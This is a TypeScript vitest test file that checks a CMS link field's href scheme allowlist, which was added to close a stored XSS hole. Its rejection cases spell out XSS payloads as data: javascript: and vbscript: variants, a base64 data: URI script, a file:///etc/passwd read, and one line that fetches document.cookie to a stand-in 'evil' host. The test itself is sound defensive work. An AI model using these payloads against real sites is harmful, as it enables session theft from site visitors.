import { describe, expect, it } from "vitest";
import { LinkValue } from "@paperboy/shared";

/**
 * A `link` field's `href` used to be `z.string().max(2000)` — any scheme accepted at
 * write and delivered verbatim.
 *
 * The repo already ruled on this for richtext (`rtSafeHref` in packages/client
 * restricts to http/https/mailto/tel//#), but that guard is unreachable for a
 * STRUCTURED link field. React happens to neutralise `javascript:` hrefs, so the
 * reference frontend hid the problem — but `@paperboycms/client` is published for
 * arbitrary frontends (Astro `set:html`, Vue, vanilla), where a stored
 * `javascript:` href is live stored XSS on the customer's public site.
 *
 * Rejected at the write chokepoint, not patched at render.
 */
describe("LinkValue.href scheme allowlist", () => {
  const ok = (href: string) => LinkValue.safeParse({ href }).success;

  it("accepts the schemes a link legitimately uses", () => {
    for (const href of [
      "https://example.com/page?a=1#x",
      "http://example.com",
      "mailto:editor@example.com",
      "tel:+4712345678",
      "/relative/path",
      "#anchor",
      "", // cleared input — not a link, but not an attack either
    ]) {
      expect(ok(href), `expected ${JSON.stringify(href)} to be accepted`).toBe(true);
    }
  });

  it("rejects script-executing and data schemes", () => {
    for (const href of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      "  javascript:alert(1)",
      "jAvAsCrIpT:fetch('//evil/'+document.cookie)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
    ]) {
      expect(ok(href), `expected ${JSON.stringify(href)} to be REJECTED`).toBe(false);
    }
  });

  it("the refusal is self-teaching: it names the allowed schemes and gives an example", () => {
    const res = LinkValue.safeParse({ href: "javascript:alert(1)" });
    expect(res.success).toBe(false);
    const message = res.success ? "" : res.error.issues[0]!.message;
    expect(message).toMatch(/https?:\/\//);
    expect(message).toMatch(/javascript/i);
    expect(message).toMatch(/"href"/);
  });

  it("still enforces the length cap and the other link fields", () => {
    expect(ok(`https://example.com/${"a".repeat(2000)}`)).toBe(false);
    expect(LinkValue.safeParse({ href: "https://e.com", target: "_blank" }).success).toBe(true);
    expect(LinkValue.safeParse({ href: "https://e.com", target: "_top" }).success).toBe(false);
  });
});
